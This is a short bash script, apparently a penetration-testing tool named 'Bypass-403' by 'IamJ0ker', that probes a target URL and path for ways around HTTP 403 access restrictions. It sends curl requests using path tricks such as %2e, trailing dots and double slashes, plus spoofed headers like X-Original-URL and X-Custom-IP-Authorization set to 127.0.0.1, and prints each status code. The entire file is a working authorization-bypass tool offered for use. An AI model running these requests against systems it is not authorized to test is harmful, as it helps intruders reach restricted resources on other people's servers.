#! /bin/bash
figlet Bypass-403
echo "                                               By IamJ0ker"
echo "./bypass-403.sh https://example.com path"
sleep 2
curl -s -o /dev/null -iL -w "%{http_code}" $1/$2
echo "  --> ${1}/${2}"
curl -s -o /dev/null -iL -w "%{http_code}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -s -o /dev/null -iL -w "%{http_code}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -s -o /dev/null -iL -w "%{http_code}" $1//$2//
echo "  --> ${1}//${2}//"
curl -s -o /dev/null -iL -w "%{http_code}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
curl -s -o /dev/null -iL -w "%{http_code}" -H "X-Original-URL: /$2" $1/$2
echo "  --> ${1}/${2} -H X-Original-URL: /${2}"
curl -s -o /dev/null -iL -w "%{http_code}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
